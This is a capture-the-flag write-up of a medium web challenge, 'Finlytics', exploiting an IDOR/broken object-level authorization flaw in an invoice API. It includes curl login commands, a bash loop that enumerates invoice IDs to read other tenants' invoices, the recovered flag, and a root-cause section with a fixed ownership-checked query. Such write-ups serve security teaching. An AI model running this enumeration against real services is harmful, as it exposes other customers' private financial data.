# _FINLYTICS

**Category:** Web  
**Difficulty:** Medium  
**Points:** 300  
**Vulnerability:** IDOR / Broken Object Level Authorization

---

## Challenge Description

Finlytics is a billing and invoicing platform used by multiple companies.

We are provided with a standard customer account and asked to determine whether it is possible to access data belonging to other customers.

---

## Initial Recon

The application was running at:

```text
http://34.47.170.218:37239
```

Requesting the root endpoint redirected us to:

```text
/login
```

The login page exposed a demo account:

```text
Username: alice
Password: Alice@2024!
```

The application accepted these credentials and redirected the authenticated session to `/dashboard`.

---

## Authentication

We authenticated while saving the session cookie:

```bash
BASE="http://34.47.170.218:37239"
JAR=/tmp/finlytics.jar

curl -i -sS \
  -c "$JAR" \
  -b "$JAR" \
  -X POST "$BASE/login" \
  --data-urlencode 'username=alice' \
  --data-urlencode 'password=Alice@2024!'
```

The server returned:

```text
HTTP/1.1 302 FOUND
Location: /dashboard
```

The resulting session belonged to:

```text
Alice Mercer
Bluepeak Logistics
Account #2
```



---

## Discovering the Invoice API

Inspecting the dashboard source revealed the frontend API calls.

The invoice list was loaded using:

```javascript
fetch("/api/invoices")
```

Individual invoices were retrieved using:

```javascript
fetch(`/api/invoice/${id}`)
```

 

The invoice detail modal displayed fields including:

```text
billed_to
billed_to_company
amount
status
issued_on
due_on
memo
```



This made `/api/invoice/<id>` the most interesting endpoint to investigate.

---

## Identifying Alice's Legitimate Invoices

Requesting:

```bash
curl -sS -b "$JAR" "$BASE/api/invoices"
```

returned three invoices belonging to Alice's account:

```text
ID 109
ID 110
ID 111
```

All three belonged to:

```text
Alice Mercer
Bluepeak Logistics
```



Further inspection confirmed the same ownership information:

```text
109 → Bluepeak Logistics
110 → Bluepeak Logistics
111 → Bluepeak Logistics
```



---

## Testing for IDOR

Since invoice IDs were numeric, we attempted to retrieve invoices outside Alice's legitimate range.

For example:

```bash
curl -sS -b "$JAR" \
  "$BASE/api/invoice/100" | jq .
```

The server returned an invoice belonging to another company:

```json
{
  "id": 100,
  "billed_to": "Noah Ruiz",
  "billed_to_company": "Glint Jewelry",
  "invoice_number": "INV-5512"
}
```



This confirmed an **IDOR / Broken Object Level Authorization** vulnerability.

The application verified that we were authenticated, but did not verify whether the requested invoice belonged to the authenticated user.

---

## Enumerating Invoice IDs

We enumerated valid invoice IDs with:

```bash
for id in $(seq 1 150); do
    r=$(curl -sS -b "$JAR" "$BASE/api/invoice/$id")

    if echo "$r" | jq -e '.invoice_number' >/dev/null 2>&1; then
        echo "$r" | jq -r \
          '"ID='"$id"' | \(.invoice_number) | \(.billed_to_company) | \(.billed_to) | memo=\(.memo)"'
    fi
done
```

The endpoint exposed invoices belonging to many unrelated companies, confirming that object ownership checks were completely missing.

---

## Finding the Flag

Invoice ID `1` was particularly interesting:

```text
ID=1
Invoice: INV-0001
Company: Finlytics Inc.
Billed To: Finlytics Internal Billing
```

Its memo contained:

```text
Internal reconciliation record.
Do not expose externally.
Support escalation token:
cyberweek{1d0r_1s_ju5t_m1ss1ng_0wn3rsh1p_ch3ck5}
```



---

## Flag

```text
cyberweek{1d0r_1s_ju5t_m1ss1ng_0wn3rsh1p_ch3ck5}
```

---

## Root Cause

The vulnerable endpoint was:

```text
GET /api/invoice/<id>
```

The application correctly required authentication, but authorization was incomplete.

Conceptually, the vulnerable logic was equivalent to:

```python
invoice = Invoice.query.get(invoice_id)

return invoice
```

without validating that the invoice actually belonged to the logged-in user.

A secure implementation should verify ownership before returning the object:

```python
invoice = Invoice.query.filter_by(
    id=invoice_id,
    account_id=current_user.account_id
).first_or_404()
```

---

## Impact

An authenticated low-privileged customer could access invoices belonging to other customers simply by modifying the numeric invoice ID.

Exposed data included:

```text
Customer names
Company names
Invoice amounts
Invoice status
Invoice dates
Internal memo fields
Sensitive internal records
```

The internal invoice ultimately exposed the challenge flag.

---

## Vulnerability Summary

```text
Type: IDOR / BOLA
Endpoint: /api/invoice/<id>
Authentication Required: Yes
Authorization Check: Missing
Attack Vector: Modify numeric invoice ID
Impact: Cross-tenant invoice disclosure
```

The core issue was not authentication.

The application knew who Alice was, but failed to verify whether the invoice she requested actually belonged to her account.